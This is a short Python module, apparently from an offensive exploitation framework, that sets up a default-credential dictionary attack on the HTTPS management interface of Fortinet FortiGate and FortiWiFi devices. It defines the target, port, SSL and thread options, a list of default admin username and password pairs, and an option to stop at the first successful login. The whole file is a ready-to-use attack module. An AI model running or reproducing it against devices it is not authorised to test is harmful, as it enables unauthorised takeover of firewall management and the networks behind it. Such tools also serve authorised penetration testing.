# Author: André Henrique (LinkedIn/X: @mrhenrike)
from embedxpl.core.exploit import *
from embedxpl.modules.creds.generic.http_multi_auth_default import Exploit as HTTPDefault


class Exploit(HTTPDefault):
    """Fortinet FortiGate Default Web Interface Credentials.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Fortinet FortiGate Default Web Interface Credentials",
        "description": (
            "Dictionary attack with default credentials against Fortinet FortiGate "
            "HTTPS management interface (port 443/8080). Cherry-picked from FirewallXPL-Forge."
        ),
        "authors": ("André Henrique (@mrhenrike) — EmbedXPL-Forge",),
        "devices": (
            "Fortinet FortiGate 60E / 80E / 100E / 200E",
            "Fortinet FortiWiFi 60E / 80E",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(443, "HTTPS management port (default 443)")
    ssl = OptBool(True, "Use SSL/TLS")
    threads = OptInteger(8, "Number of threads")
    defaults = OptWordlist(
        "admin:,admin:admin,admin:password,admin:fortinet",
        "User:Pass pairs",
    )
    stop_on_success = OptBool(True, "Stop on first valid authentication")
